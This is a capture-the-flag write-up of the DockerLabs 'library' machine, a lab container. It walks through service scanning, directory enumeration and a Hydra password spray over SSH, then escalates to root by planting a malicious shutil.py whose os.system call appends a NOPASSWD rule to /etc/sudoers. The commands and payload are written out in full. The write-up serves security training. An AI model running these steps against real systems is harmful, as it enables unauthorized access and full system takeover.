# library

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| library | El Pingüino de Mario | easy | dockerlabs |

**Summary:** The compromise began with straightforward service discovery that exposed SSH and Apache, followed by forced browsing that revealed a minimal `index.php` endpoint returning what looked like a high entropy token. That token was then repurposed as an SSH password candidate while Hydra tested a large username corpus, producing valid credentials for `carlos`. After interactive access, local enumeration identified a sudo rule that allowed execution of `/usr/bin/python3 /opt/script.py` without a password. The script imported `shutil` from the current Python module search path, so a malicious `/opt/shutil.py` was dropped to hijack the import path during privileged execution. The payload appended a full NOPASSWD sudo policy for `carlos` into `/etc/sudoers`, then `sudo -i` completed root level control.

## Recon

1. The target container was deployed and assigned the address `172.17.0.2`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/library]
└─$ sudo bash auto_deploy.sh library.tar
[sudo] password for ouba:

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

2. A full TCP scan with default scripts and version detection confirmed two exposed services, SSH on port 22 and Apache on port 80.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/library]
└─$ ip=172.17.0.2 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/library]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-14 23:06 WIB
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.94 seconds
```

3. Directory enumeration exposed an `index.php` endpoint that did not appear on the default Apache landing page.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/library]
└─$ gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/index.php            (Status: 200) [Size: 26]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/server-status        (Status: 403) [Size: 275]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

## Initial Access

1. Retrieving `index.php` returned a single uppercase string that looked like a secret or credential value.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/library]
└─$ curl -i $url/index.php
HTTP/1.1 200 OK
Date: Sat, 14 Mar 2026 16:07:08 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Tue, 07 May 2024 14:45:54 GMT
ETag: "1a-617de3e336c80"
Accept-Ranges: bytes
Content-Length: 26

<h1>JIFGHDS87GYDFIGD</h1>
```

2. Hydra was used with a large username wordlist and the recovered token as password. This identified valid SSH access as `carlos`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/library]
└─$ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://$ip -t 8
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-14 23:15:48
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8295455 login tries (l:8295455/p:1), ~1036932 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
```

3. SSH authentication succeeded and confirmed user level execution as `carlos`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/library]
└─$ ssh carlos@$ip
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:Hvih5sjfx4Qwfp0rb0aWHkFvIxZbFo+cyOaoqbCHXSI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
carlos@172.17.0.2's password:
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.87.2-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
carlos@326bbb7faa17:~$ id;whoami
uid=1001(carlos) gid=1001(carlos) groups=1001(carlos)
carlos
carlos@326bbb7faa17:~$ ls -la
total 28
drwxr-x--- 1 carlos carlos 4096 Mar 14 16:16 .
drwxr-xr-x 1 root   root   4096 May  7  2024 ..
-rw-r--r-- 1 carlos carlos  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 carlos carlos 3771 Mar 31  2024 .bashrc
drwx------ 2 carlos carlos 4096 Mar 14 16:16 .cache
-rw-r--r-- 1 carlos carlos  807 Mar 31  2024 .profile
carlos@326bbb7faa17:~$ ls -la /home
total 20
drwxr-xr-x 1 root   root   4096 May  7  2024 .
drwxr-xr-x 1 root   root   4096 Mar 14 15:49 ..
drwxr-x--- 1 carlos carlos 4096 Mar 14 16:16 carlos
drwxr-x--- 2 ubuntu ubuntu 4096 Apr 29  2024 ubuntu
carlos@326bbb7faa17:~$ which sudo
/usr/bin/sudo
carlos@326bbb7faa17:~$ sudo -l
Matching Defaults entries for carlos on 326bbb7faa17:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on 326bbb7faa17:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
carlos@326bbb7faa17:~$ ls -la /opt/script.py
-r-xr--r-- 1 carlos root 272 May  7  2024 /opt/script.py
carlos@326bbb7faa17:~$ cat /opt/script.py
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)

carlos@326bbb7faa17:~$ echo 'import os; os.system("echo \"carlos ALL=(ALL:ALL) NOPASSWD: ALL\" >> /etc/sudoers")' > /opt/shutil.py
carlos@326bbb7faa17:~$ sudo /usr/bin/python3 /opt/script.py
Traceback (most recent call last):
  File "/opt/script.py", line 10, in <module>
    copiar_archivo(origen, destino)
  File "/opt/script.py", line 4, in copiar_archivo
    shutil.copy(origen, destino)
    ^^^^^^^^^^^
AttributeError: module 'shutil' has no attribute 'copy'
carlos@326bbb7faa17:~$ sudo -l
Matching Defaults entries for carlos on 326bbb7faa17:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on 326bbb7faa17:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
    (ALL : ALL) NOPASSWD: ALL
carlos@326bbb7faa17:~$ sudo -i
root@326bbb7faa17:~# id;whoami;hostname;pwd;ls -la
uid=0(root) gid=0(root) groups=0(root)
root
326bbb7faa17
/root
total 20
drwx------ 1 root root 4096 May  7  2024 .
drwxr-xr-x 1 root root 4096 Mar 14 15:49 ..
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 2 root root 4096 May  7  2024 .ssh
root@326bbb7faa17:~#
```

## Privilege Escalation

1. The escalation vector was an import path trust issue inside a root executable Python workflow. Because `script.py` imported `shutil` and the attacker could write to `/opt`, a malicious module named `/opt/shutil.py` was introduced.

2. When `sudo /usr/bin/python3 /opt/script.py` executed, Python resolved the attacker controlled module first, then executed the command that modified `/etc/sudoers`. The resulting traceback was expected because the fake module lacked `copy`, but the malicious `os.system` call had already run.

3. A second `sudo -l` confirmed unrestricted sudo rights for `carlos`, and `sudo -i` yielded a root shell with full control of the container.

## Attack Chain Summary

1. **Reconnaissance**: Full TCP and web content enumeration identified SSH and Apache, then discovered a non default `index.php` endpoint.
2. **Vulnerability Discovery**: The web endpoint exposed a credential like token in clear text without authentication.
3. **Exploitation**: The token was used as an SSH password while Hydra brute forced usernames, resulting in valid access as `carlos`.
4. **Internal Enumeration**: Sudo policy and local file permissions revealed a privileged Python script that imported a module from a writable path.
5. **Privilege Escalation**: A malicious `shutil.py` achieved import hijacking, injected a sudoers rule, and enabled root access through `sudo -i`.
